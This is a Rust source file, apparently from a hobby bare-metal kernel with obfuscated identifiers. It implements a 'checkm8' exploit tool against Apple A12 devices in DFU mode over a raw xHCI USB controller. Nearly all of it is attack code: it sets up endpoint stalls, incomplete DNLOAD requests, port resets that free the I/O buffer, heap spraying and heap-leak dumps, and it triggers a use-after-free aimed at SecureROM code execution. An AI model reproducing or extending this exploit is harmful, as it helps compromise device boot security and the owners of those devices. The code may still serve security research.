
















use alloc::string::String;
use alloc::vec::Vec;
use alloc::format;
use core::ptr;
use core::sync::atomic::Ordering;

use super::xhci::{
    self, Trb, Bm, Aoo, Aop, Zp, Ve,
    auv, Bn, Be,
    
    XV_, AJD_, XW_, XU_,
    
    DA_, EV_,
    
    AGO_, OZ_, PA_, KY_, BDJ_,
    BDK_,
};


const AKS_: u16 = 0x05AC;
const AQH_: u16 = 0x1227;


const HU_: u8 = 1;
const BRR_: u8 = 2;
const BRO_: u8 = 3;
const BRN_: u8 = 4;
const DJF_: u8 = 5;
const BRM_: u8 = 6;


const YA_: u8 = 0x00;
const LK_: u8 = 0x80;
const LM_: u8 = 0x00;
const BIB_: u8 = 0x20;
const LL_: u8 = 0x00;
const QH_: u8 = 0x01;


const FC_: u8 = BIB_ | QH_; 
const AQG_: u8 = LK_ | BIB_ | QH_; 


const QI_: u8 = 0x06;


const BRQ_: u8 = 2;
const DJH_: u8 = 3;
const DJG_: u8 = 5;
const DJJ_: u8 = 6;
const DJI_: u8 = 7;
const BRP_: u8 = 10;


const CYO_: u32 = 15;


const MD_: u8 = 1;
const ANT_: u8 = 13;
const DEL_: u8 = 6;
const DEK_: u8 = 3;
const DEM_: u8 = 26;
const DEN_: u8 = 27;






fn ste() -> Option<u8> {
    let ik = xhci::bhh();
    for ba in &ik {
        if ba.ml == AKS_ && ba.cgt == AQH_ {
            return Some(ba.fw);
        }
    }
    None
}


fn stc() -> Option<u8> {
    let ik = xhci::bhh();
    for ba in &ik {
        if ba.ml == AKS_ && ba.cgt == AQH_ {
            return Some(ba.port);
        }
    }
    None
}



fn fnn(
    cdh: u8,
    cda: u8,
    cis: u16,
    cir: u16,
    bsw: u16,
    mne: u8, 
) -> Trb {
    let dlq = (cdh as u64)
        | ((cda as u64) << 8)
        | ((cis as u64) << 16)
        | ((cir as u64) << 32)
        | ((bsw as u64) << 48);

    Trb {
        bhr: dlq,
        status: 8, 
        control: (XV_ << 10) | (1 << 6) | ((mne as u32) << 16), 
    }
}


fn jer(rg: u64, go: u32, kqb: bool) -> Trb {
    Trb {
        bhr: rg,
        status: go,
        control: (AJD_ << 10) | if kqb { 1 << 16 } else { 0 },
    }
}


fn jeu(kqb: bool) -> Trb {
    Trb {
        bhr: 0,
        status: 0,
        control: (XW_ << 10) | EV_ | if kqb { 1 << 16 } else { 0 },
    }
}






fn ypl(fw: u8, abj: Trb) -> bool {
    let mut um = super::xhci::CC_.lock();
    let bcr = match um.ds(fw as usize).and_then(|m| m.as_mut()) {
        Some(m) => m,
        None => return false,
    };
    bcr.beb.azt(abj);
    true
}




fn fsw(bub: u64, fw: u8) {
    unsafe {
        let ng = (bub + (fw as u64) * 4) as *mut u32;
        ptr::write_volatile(ng, 1); 
    }
}



fn dks(df: &mut Bm, uli: u32) -> Option<(u8, u32, u8)> {
    for _ in 0..uli {
        let w = df.bgy;
        let abj = df.fib[w];

        let ib = (abj.control & DA_) != 0;
        if ib == df.cqg {
            df.bgy += 1;
            if df.bgy >= 256 {
                df.bgy = 0;
                df.cqg = !df.cqg;
            }

            let hig = df.epz + (df.bgy as u64 * 16);
            let flv = (df.ftj + 0x20) as *mut Zp;
            unsafe {
                (*flv).fhy = hig | (1 << 3); 
            }

            let fah = (abj.control >> 10) & 0x3F;
            let enu = ((abj.status >> 24) & 0xFF) as u8;

            if fah == 32 { 
                let mmt = abj.status & 0xFFFFFF;
                let ktp = ((abj.control >> 16) & 0x1F) as u8;
                return Some((enu, mmt, ktp));
            }
            if fah == 33 { 
                let fw = ((abj.control >> 24) & 0xFF) as u8;
                return Some((enu, 0, fw));
            }
            
            continue;
        }
        core::hint::hc();
    }
    None
}


fn say(df: &mut Bm) {
    for _ in 0..1000 {
        if dks(df, 100).is_none() {
            break;
        }
    }
}





fn hcl(nn: u8) -> &'static str {
    match nn {
        1 => "SUCCESS",
        2 => "DATA_BUFFER_ERROR",
        3 => "BABBLE",
        4 => "USB_TRANSACTION_ERROR",
        5 => "TRB_ERROR",
        6 => "STALL",
        7 => "RESOURCE_ERROR",
        8 => "BANDWIDTH_ERROR",
        9 => "NO_SLOTS",
        10 => "INVALID_STREAM_TYPE",
        11 => "SLOT_NOT_ENABLED",
        12 => "EP_NOT_ENABLED",
        13 => "SHORT_PACKET",
        14 => "RING_UNDERRUN",
        15 => "RING_OVERRUN",
        16 => "VF_EVENT_RING_FULL",
        17 => "PARAMETER_ERROR",
        21 => "CONTEXT_STATE_ERROR",
        26 => "STOPPED",
        27 => "STOPPED_LENGTH_INVALID",
        _ => "UNKNOWN",
    }
}






fn gyh() -> Option<(u64, u64)> {
    let ht = crate::memory::frame::azg()?;
    let ju = auv(ht);
    Some((ht, ju))
}


fn fjb(ht: u64) {
    crate::memory::frame::apt(ht);
}



fn nwr(
    df: &mut Bm,
    fw: u8,
    cdh: u8,
    cda: u8,
    cis: u16,
    cir: u16,
    bsw: u16,
    rg: u64,
) -> Option<u32> {
    
    {
        let mut um = super::xhci::CC_.lock();
        let adz = um.ds(fw as usize)?.as_mut()?;

        let aeq = fnn(cdh, cda, cis, cir, bsw, 3);
        adz.beb.azt(aeq);

        if bsw > 0 {
            let f = jer(rg, bsw as u32, true);
            adz.beb.azt(f);
        }

        let status = jeu(false); 
        adz.beb.azt(status);
    }

    fsw(df.bub, fw);

    if let Some((nn, len, _)) = dks(df, 5_000_000) {
        if nn == MD_ || nn == ANT_ {
            return Some(len);
        }
    }
    None
}


fn syv(
    df: &mut Bm,
    fw: u8,
    cdh: u8,
    cda: u8,
    cis: u16,
    cir: u16,
    bsw: u16,
    rg: u64,
) -> Option<u32> {
    {
        let mut um = super::xhci::CC_.lock();
        let adz = um.ds(fw as usize)?.as_mut()?;

        let mne = if bsw > 0 { 2 } else { 0 }; 
        let aeq = fnn(cdh, cda, cis, cir, bsw, mne);
        adz.beb.azt(aeq);

        if bsw > 0 {
            let f = jer(rg, bsw as u32, false);
            adz.beb.azt(f);
        }

        let status = jeu(true); 
        adz.beb.azt(status);
    }

    fsw(df.bub, fw);

    if let Some((nn, len, _)) = dks(df, 5_000_000) {
        if nn == MD_ || nn == ANT_ {
            return Some(len);
        }
    }
    None
}


fn cwy(df: &mut Bm, fw: u8) -> Option<(u8, u8)> {
    let (rg, aak) = gyh()?;
    let result = nwr(df, fw, AQG_, BRO_, 0, 0, 6, rg);
    let aux = if result.is_some() {
        let kbq = unsafe { ptr::read_volatile(aak as *const u8) };
        let iki = unsafe { ptr::read_volatile((aak + 4) as *const u8) };
        Some((kbq, iki))
    } else {
        None
    };
    fjb(rg);
    aux
}


fn kps(df: &mut Bm, fw: u8) -> bool {
    {
        let mut um = super::xhci::CC_.lock();
        let adz = match um.ds(fw as usize).and_then(|m| m.as_mut()) {
            Some(m) => m,
            None => return false,
        };
        let aeq = fnn(FC_, BRM_, 0, 0, 0, 0);
        adz.beb.azt(aeq);
        let status = jeu(true); 
        adz.beb.azt(status);
    }
    fsw(df.bub, fw);
    dks(df, 2_000_000).map(|(nn, _, _)| nn == MD_).unwrap_or(false)
}


fn rxe(df: &mut Bm, fw: u8) -> bool {
    {
        let mut um = super::xhci::CC_.lock();
        let adz = match um.ds(fw as usize).and_then(|m| m.as_mut()) {
            Some(m) => m,
            None => return false,
        };
        let aeq = fnn(FC_, BRN_, 0, 0, 0, 0);
        adz.beb.azt(aeq);
        let status = jeu(true);
        adz.beb.azt(status);
    }
    fsw(df.bub, fw);
    dks(df, 2_000_000).map(|(nn, _, _)| nn == MD_).unwrap_or(false)
}


fn gep(df: &mut Bm, fw: u8, f: &[u8]) -> Option<u8> {
    let (rg, aak) = gyh()?;
    let len = f.len().v(4096) as u16;
    
    unsafe {
        ptr::copy_nonoverlapping(f.fq(), aak as *mut u8, len as usize);
    }
    let result = syv(df, fw, FC_, HU_, 0, 0, len, rg);
    fjb(rg);

    
    result.map(|_| MD_)
}


fn nle(df: &mut Bm, fw: u8, k: &mut [u8]) -> Option<u32> {
    let (rg, aak) = gyh()?;
    let len = k.len().v(4096) as u16;
    let result = nwr(df, fw, AQG_, BRR_, 0, 0, len, rg);
    if let Some(ieu) = result {
        let zg = (ieu as usize).v(k.len());
        unsafe {
            ptr::copy_nonoverlapping(aak as *const u8, k.mw(), zg);
        }
    }
    fjb(rg);
    result
}


fn dbf(df: &mut Bm, fw: u8) -> bool {
    for _ in 0..20 {
        if let Some((_, g)) = cwy(df, fw) {
            if g == BRQ_ {
                return true;
            }
            if g == BRP_ {
                rxe(df, fw);
                continue;
            }
            kps(df, fw);
        } else {
            return false; 
        }
        
        for _ in 0..100_000 { core::hint::hc(); }
    }
    false
}










fn iaa(
    df: &mut Bm,
    fw: u8,
    cdh: u8,
    cda: u8,
    cis: u16,
    cir: u16,
    bsw: u16,
) -> Option<u8> {
    {
        let mut um = super::xhci::CC_.lock();
        let adz = match um.ds(fw as usize).and_then(|m| m.as_mut()) {
            Some(m) => m,
            None => return None,
        };

        
        
        
        let mut aeq = fnn(cdh, cda, cis, cir, bsw, 0);
        aeq.control |= EV_; 
        adz.beb.azt(aeq);
    }

    fsw(df.bub, fw);

    
    dks(df, 2_000_000).map(|(nn, _, _)| nn)
}





fn wlg(
    df: &mut Bm,
    fw: u8,
    cdh: u8,
    cda: u8,
    cis: u16,
    cir: u16,
    bsw: u16,      
    mtr: &[u8], 
) -> Option<u8> {
    let (rg, aak) = gyh()?;
    let fck = mtr.len().v(4096);
    unsafe {
        ptr::copy_nonoverlapping(mtr.fq(), aak as *mut u8, fck);
    }

    {
        let mut um = super::xhci::CC_.lock();
        let adz = match um.ds(fw as usize).and_then(|m| m.as_mut()) {
            Some(m) => m,
            None => { fjb(rg); return None; },
        };

        
        let aeq = fnn(cdh, cda, cis, cir, bsw, 2);
        adz.beb.azt(aeq);

        
        
        let mut f = jer(rg, fck as u32, false); 
        f.control |= EV_;
        adz.beb.azt(f);

        
    }

    fsw(df.bub, fw);

    let result = dks(df, 5_000_000).map(|(nn, _, _)| nn);
    fjb(rg);
    result
}



fn wkm(
    df: &mut Bm,
    fw: u8,
    cdh: u8,
    cda: u8,
    cis: u16,
    cir: u16,
    f: &[u8],
) -> Option<u8> {
    let (rg, aak) = gyh()?;
    let len = f.len().v(4096);
    unsafe {
        ptr::copy_nonoverlapping(f.fq(), aak as *mut u8, len);
    }

    {
        let mut um = super::xhci::CC_.lock();
        let adz = match um.ds(fw as usize).and_then(|m| m.as_mut()) {
            Some(m) => m,
            None => { fjb(rg); return None; },
        };

        let aeq = fnn(cdh, cda, cis, cir, len as u16, 2);
        adz.beb.azt(aeq);

        let mut iqq = jer(rg, len as u32, false);
        iqq.control |= EV_;
        adz.beb.azt(iqq);
        
    }

    fsw(df.bub, fw);

    let result = dks(df, 5_000_000).map(|(nn, _, _)| nn);
    fjb(rg);
    result
}





fn ibq(df: &mut Bm, fw: u8) -> Option<u8> {
    iaa(
        df, fw,
        LK_ | LM_ | LL_, 
        QI_,                             
        0x0304,  
        0x040A,  
        0xC1,    
    )
}



fn wuo(df: &mut Bm, fw: u8) -> Option<u8> {
    let abj = Trb {
        bhr: 0,
        status: 0,
        
        control: (CYO_ << 10) | ((fw as u32) << 24) | (1 << 16),
    };

    
    super::xhci::icd(df, abj);

    
    dks(df, 2_000_000).map(|(nn, _, _)| nn)
}



fn lux(df: &mut Bm, kg: u8) -> bool {
    let hvr = df.cvt
        + (unsafe { &*df.feh }.gcf as u64)
        + 0x400;

    let hvs = (hvr + ((kg as u64 - 1) * 16)) as *mut Aop;
    let port = unsafe { &mut *hvs };

    let bht = port.bht;

    
    port.bht = (bht & !OZ_) | PA_;

    
    for _ in 0..200 {
        for _ in 0..200_000 { core::hint::hc(); }
        let fox = port.bht;
        if (fox & PA_) == 0 && (fox & KY_) != 0 {
            
            port.bht = fox | KY_;
            return true;
        }
    }
    false
}


fn bkd(df: &mut Bm, kg: u8) -> bool {
    let hvr = df.cvt
        + (unsafe { &*df.feh }.gcf as u64)
        + 0x400;

    let hvs = (hvr + ((kg as u64 - 1) * 16)) as *mut Aop;
    let bht = unsafe { (*hvs).bht };
    (bht & AGO_) != 0
}


fn azo(ifz: u32) {
    
    let bbu = ifz as u64 * 400;
    for _ in 0..bbu {
        core::hint::hc();
    }
}


fn azn(jn: u32) {
    azo(jn * 1000);
}






pub fn wbg(n: &str) -> String {
    let mut an = String::new();

    an.t("=== checkm8 A12 SecureROM Exploit Tool ===\n");
    an.t("Target: Apple A12 (T8020) DFU mode\n");
    an.t("Method: Bare-metal xHCI TRB manipulation\n\n");

    
    if !Be.load(Ordering::Relaxed) {
        an.t("ERROR: xHCI controller not initialized\n");
        an.t("  Run 'lsusb' first to verify USB is working\n");
        return an;
    }

    
    let fw = match ste() {
        Some(e) => e,
        None => {
            an.t("ERROR: No Apple DFU device found (VID=05AC PID=1227)\n");
            an.t("  Put your iPhone in DFU mode and connect via USB\n");
            let ik = xhci::bhh();
            if ik.is_empty() {
                an.t("  No USB devices detected at all\n");
            } else {
                an.t("  Connected USB devices:\n");
                for bc in &ik {
                    an.t(&format!("    Slot {}: VID={:04X} PID={:04X} {}\n",
                        bc.fw, bc.ml, bc.cgt, bc.baj));
                }
            }
            return an;
        }
    };

    let kg = stc().unwrap_or(0);
    an.t(&format!("Found DFU device: slot={}, port={}\n\n", fw, kg));

    
    match n.em() {
        "status" | "s" => rin(&mut an, fw, kg),
        "stall" | "st" => rjf(&mut an, fw, kg),
        "partial" | "p" => rje(&mut an, fw, kg),
        "uaf" | "u" => rjg(&mut an, fw, kg),
        "exploit" | "e" | "go" => ren(&mut an, fw, kg),
        "help" | "h" | "" => {
            an.t("Subcommands:\n");
            an.t("  status   — Query DFU device state\n");
            an.t("  stall    — Test EP0 stall primitives (SETUP-only, IN stall)\n");
            an.t("  partial  — Test partial DATA transfers\n");
            an.t("  uaf      — Test Use-After-Free with stall + spray\n");
            an.t("  exploit  — Run full checkm8 exploit sequence\n");
            an.t("  help     — This help\n");
        }
        gq => {
            an.t(&format!("Unknown subcommand: '{}'. Try 'checkm8 help'\n", gq));
        }
    }

    an
}





fn rin(an: &mut String, fw: u8, kg: u8) {
    an.t("--- DFU Device Status ---\n");

    let mut db = Bn.lock();
    let df = match db.as_mut() {
        Some(r) => r,
        None => { an.t("ERROR: xHCI controller not available\n"); return; }
    };

    let dzr = bkd(df, kg);
    an.t(&format!("  Port {}: connected={}\n", kg, dzr));

    if let Some((kbq, iki)) = cwy(df, fw) {
        let mhm = match iki {
            0 => "appIDLE",
            1 => "appDETACH",
            2 => "dfuIDLE",
            3 => "dfuDNLOAD-SYNC",
            4 => "dfuDNBUSY",
            5 => "dfuDNLOAD-IDLE",
            6 => "dfuMANIFEST-SYNC",
            7 => "dfuMANIFEST",
            8 => "dfuMANIFEST-WAIT-RESET",
            9 => "dfuUPLOAD-IDLE",
            10 => "dfuERROR",
            _ => "UNKNOWN",
        };
        an.t(&format!("  DFU status: bStatus={}, bState={} ({})\n",
            kbq, iki, mhm));
    } else {
        an.t("  DFU GETSTATUS failed (device not responding)\n");
    }
}





fn rjf(an: &mut String, fw: u8, kg: u8) {
    an.t("--- Test: EP0 Stall Primitives ---\n\n");

    let mut db = Bn.lock();
    let df = match db.as_mut() {
        Some(r) => r,
        None => { an.t("ERROR: controller unavailable\n"); return; }
    };

    
    let fkz = dbf(df, fw);
    an.t(&format!("Reset to IDLE: {}\n", fkz));

    
    an.t("\n[T1] SETUP-only DNLOAD (wLength=0x800, no DATA/STATUS):\n");
    {
        let nn = iaa(df, fw, FC_, HU_, 0, 0, 0x800);
        an.t(&format!("  Completion: {:?} ({})\n",
            nn, nn.map(hcl).unwrap_or("timeout")));

        if let Some((_, g)) = cwy(df, fw) {
            an.t(&format!("  State after: {}\n", g));
        } else {
            an.t("  Device not responding after setup-only\n");
        }
        let bje = bkd(df, kg);
        an.t(&format!("  Connected: {}\n", bje));
    }

    
    azn(100);
    dbf(df, fw);

    
    an.t("\n[T2] IN stall (GET_DESCRIPTOR setup-only, no DATA IN TRB):\n");
    {
        let nn = ibq(df, fw);
        an.t(&format!("  Completion: {:?} ({})\n",
            nn, nn.map(hcl).unwrap_or("timeout")));

        if let Some((_, g)) = cwy(df, fw) {
            an.t(&format!("  State after: {}\n", g));
        } else {
            an.t("  Device not responding after IN stall\n");
        }
    }

    azn(100);
    dbf(df, fw);

    
    an.t("\n[T3] DNLOAD + DATA (0x800 bytes) but NO STATUS:\n");
    {
        let f = [0xAA_u8; 0x800];
        let nn = wkm(df, fw, FC_, HU_, 0, 0, &f);
        an.t(&format!("  Completion: {:?} ({})\n",
            nn, nn.map(hcl).unwrap_or("timeout")));

        azn(50);
        if let Some((_, g)) = cwy(df, fw) {
            an.t(&format!("  State after: {}\n", g));
        } else {
            an.t("  Device not responding\n");
        }
    }

    azn(100);
    dbf(df, fw);

    
    an.t("\n[T4] SETUP-only DNLOAD → Stop Endpoint → check:\n");
    {
        let nn = iaa(df, fw, FC_, HU_, 0, 0, 0x800);
        an.t(&format!("  Setup completion: {:?}\n", nn));

        let pow = wuo(df, fw);
        an.t(&format!("  Stop EP: {:?} ({})\n",
            pow, pow.map(hcl).unwrap_or("timeout")));

        if let Some((_, g)) = cwy(df, fw) {
            an.t(&format!("  State: {}\n", g));
        } else {
            an.t("  Not responding\n");
        }
    }

    azn(100);

    
    an.t("\n[T5] Multiple IN stalls (×5):\n");
    dbf(df, fw);
    for a in 0..5 {
        let nn = ibq(df, fw);
        let bje = bkd(df, kg);
        an.t(&format!("  Stall #{}: cc={:?}, alive={}\n", a, nn, bje));
        if !bje {
            an.t("  Device disconnected!\n");
            break;
        }
    }
}





fn rje(an: &mut String, fw: u8, kg: u8) {
    an.t("--- Test: Partial DATA Transfers ---\n\n");

    let mut db = Bn.lock();
    let df = match db.as_mut() {
        Some(r) => r,
        None => { an.t("ERROR: controller unavailable\n"); return; }
    };

    dbf(df, fw);

    
    let wpe: &[usize] = &[0, 1, 64, 128, 512, 1024, 2047];

    for &mts in wpe {
        an.t(&format!("\n[wLength=0x800, actual={}B]:\n", mts));
        dbf(df, fw);

        let f = alloc::vec![0xBB_u8; mts];
        let nn = wlg(
            df, fw,
            FC_, HU_, 0, 0,
            0x800,  
            &f,  
        );
        an.t(&format!("  Completion: {:?} ({})\n",
            nn, nn.map(hcl).unwrap_or("timeout")));

        azn(50);
        let bje = bkd(df, kg);
        an.t(&format!("  Connected: {}\n", bje));

        if bje {
            if let Some((_, g)) = cwy(df, fw) {
                an.t(&format!("  State: {}\n", g));
            }
        } else {
            an.t("  Device disconnected! Waiting...\n");
            
            for ccm in 0..60 {
                azn(1000);
                if bkd(df, kg) {
                    an.t(&format!("  Reconnected after {}s\n", ccm + 1));
                    break;
                }
            }
        }
    }
}





fn rjg(an: &mut String, fw: u8, kg: u8) {
    an.t("--- Test: UAF with EP0 Stall ---\n");
    an.t("Sequence: stall → DNLOAD → ABORT → spray → trigger\n\n");

    let mut db = Bn.lock();
    let df = match db.as_mut() {
        Some(r) => r,
        None => { an.t("ERROR: controller unavailable\n"); return; }
    };

    
    for lig in &[1u32, 5, 10] {
        an.t(&format!("\n[Flow A: {} leak rounds]\n", lig));
        dbf(df, fw);

        
        let wsg = ibq(df, fw);
        an.t(&format!("  1. IN stall: cc={:?}\n", wsg));
        if !bkd(df, kg) {
            an.t("  CRASHED at stall\n");
            continue;
        }

        
        let mut fmv = 0u32;
        for a in 0..*lig {
            let kqk = [0u8; 0x800];
            let ymn = gep(df, fw, &kqk);
            if !bkd(df, kg) {
                an.t(&format!("  2. CRASHED at leak round {}\n", a));
                break;
            }
            cwy(df, fw);
            if !bkd(df, kg) {
                an.t(&format!("  2. CRASHED at getstatus round {}\n", a));
                break;
            }
            fmv += 1;
        }
        an.t(&format!("  2. Leaked {}/{} rounds\n", fmv, lig));

        if !bkd(df, kg) { continue; }

        
        an.t("  3. USB port reset...\n");
        let hxo = lux(df, kg);
        an.t(&format!("     Reset: {}\n", if hxo { "OK" } else { "FAILED" }));
        azn(500);

        if !bkd(df, kg) {
            an.t("  Device gone after reset\n");
            continue;
        }

        
        if let Some((_, g)) = cwy(df, fw) {
            an.t(&format!("  4. State after reset: {}\n", g));
        } else {
            an.t("  4. GETSTATUS failed\n");
        }

        
        an.t("  5. Spraying (GETSTATUS ×128)...\n");
        for _ in 0..128 {
            cwy(df, fw);
        }

        
        let mut fxt = [0u8; 0x800];
        if let Some(ifw) = nle(df, fw, &mut fxt) {
            let hsx = fxt.iter().take(ifw as usize).any(|&o| o != 0);
            an.t(&format!("  6. UPLOAD: {}B, nonzero={}\n", ifw, hsx));
            if hsx {
                an.t("  *** HEAP DATA LEAKED! ***\n");
                an.t("  First 64 bytes: ");
                for o in fxt.iter().take(64) {
                    an.t(&format!("{:02x}", o));
                }
                an.push('\n');
            }
        } else {
            an.t("  6. UPLOAD failed\n");
        }

        
        an.t("  7. Trigger: DNLOAD→ABORT→DNLOAD...\n");
        dbf(df, fw);
        let _ = gep(df, fw, &[0xAA; 0x800]);
        kps(df, fw);

        if !bkd(df, kg) {
            an.t("  CRASHED at abort (io_buffer freed)\n");
            continue;
        }

        
        let result = gep(df, fw, &[0x55; 0x800]);
        if bkd(df, kg) {
            an.t("  *** UAF SURVIVED! Device still alive! ***\n");
        } else {
            an.t("  UAF triggered crash (expected on A12)\n");
        }
    }

    
    an.t("\n\n[Flow B: Stall + Partial Data + Abort]\n");
    
    for _ in 0..30 {
        if bkd(df, kg) { break; }
        azn(1000);
    }
    if !bkd(df, kg) {
        an.t("  Device not reconnected after 30s\n");
        return;
    }

    dbf(df, fw);

    
    let ibp = ibq(df, fw);
    an.t(&format!("  1. IN stall: cc={:?}\n", ibp));

    
    let nn = iaa(df, fw, FC_, HU_, 0, 0, 0x800);
    an.t(&format!("  2. Setup-only DNLOAD: cc={:?}\n", nn));

    
    let hxo = lux(df, kg);
    an.t(&format!("  3. Port reset: {}\n", if hxo { "OK" } else { "FAIL" }));
    azn(500);

    if bkd(df, kg) {
        if let Some((_, g)) = cwy(df, fw) {
            an.t(&format!("  4. State: {}\n", g));
        }
    } else {
        an.t("  Device gone\n");
    }
}





fn ren(an: &mut String, fw: u8, kg: u8) {
    an.t("--- Full checkm8 Exploit Sequence ---\n");
    an.t("⚠  This will attempt code execution on the A12 SecureROM.\n\n");

    let mut db = Bn.lock();
    let df = match db.as_mut() {
        Some(r) => r,
        None => { an.t("ERROR: controller unavailable\n"); return; }
    };

    
    an.t("[Phase 1] Verify DFU state\n");
    if !dbf(df, fw) {
        an.t("  FAILED: Cannot reach dfuIDLE\n");
        return;
    }
    an.t("  OK: dfuIDLE\n");

    
    an.t("\n[Phase 2] Stall EP0_IN (request accumulation)\n");

    
    let mut pnv = 0;
    for a in 0..6 {
        let nn = ibq(df, fw);
        if !bkd(df, kg) {
            an.t(&format!("  CRASHED at stall #{}\n", a));
            break;
        }
        pnv += 1;
        an.t(&format!("  Stall #{}: cc={:?}\n", a, nn));
    }
    an.t(&format!("  Created {} stalls\n", pnv));

    
    an.t("\n[Phase 3] DNLOAD to set ep0DataPhaseBuffer\n");
    let kqk = [0u8; 0x800];
    let nn = gep(df, fw, &kqk);
    an.t(&format!("  DNLOAD: {:?}\n", nn));

    if !bkd(df, kg) {
        an.t("  CRASHED at DNLOAD\n");
        return;
    }

    
    an.t("\n[Phase 4] Setup-only incomplete DNLOAD\n");
    let nn = iaa(df, fw, FC_, HU_, 0, 0, 0x800);
    an.t(&format!("  Setup-only: cc={:?}\n", nn));

    
    an.t("\n[Phase 5] USB port reset (free io_buffer)\n");
    let hxo = lux(df, kg);
    an.t(&format!("  Reset: {}\n", if hxo { "OK" } else { "FAIL" }));
    azn(500);

    if !bkd(df, kg) {
        an.t("  Device left DFU after reset\n");
        return;
    }

    
    an.t("\n[Phase 6] Heap spray via GETSTATUS\n");
    let mut pml = 0;
    for _ in 0..128 {
        if cwy(df, fw).is_some() {
            pml += 1;
        }
    }
    an.t(&format!("  GETSTATUS success: {}/128\n", pml));

    
    an.t("\n[Phase 7] UPLOAD — heap data leak check\n");
    let mut fxt = [0u8; 0x800];
    if let Some(ifw) = nle(df, fw, &mut fxt) {
        let hsx = fxt.iter().take(ifw as usize).any(|&o| o != 0);
        an.t(&format!("  UPLOAD: {}B, nonzero={}\n", ifw, hsx));
        if hsx {
            an.t("  *** HEAP DATA LEAKED ***\n  ");
            for o in fxt.iter().take(128) {
                an.t(&format!("{:02x}", o));
            }
            an.push('\n');
        }
    } else {
        an.t("  UPLOAD failed\n");
    }

    
    an.t("\n[Phase 8] Trigger UAF (DNLOAD to freed io_buffer)\n");
    dbf(df, fw);
    let _ = gep(df, fw, &[0xAA; 0x800]);
    kps(df, fw);

    if bkd(df, kg) {
        
        
        let ew = [0x41u8; 0x800]; 
        let result = gep(df, fw, &ew);
        if bkd(df, kg) {
            an.t("  *** UAF WRITE SURVIVED — EXPLOITATION IN PROGRESS ***\n");
            
        } else {
            an.t("  UAF triggered crash (expected — A12 double-abort)\n");
        }
    } else {
        an.t("  Device crashed at ABORT\n");
    }

    an.t("\n--- Exploit sequence complete ---\n");
}
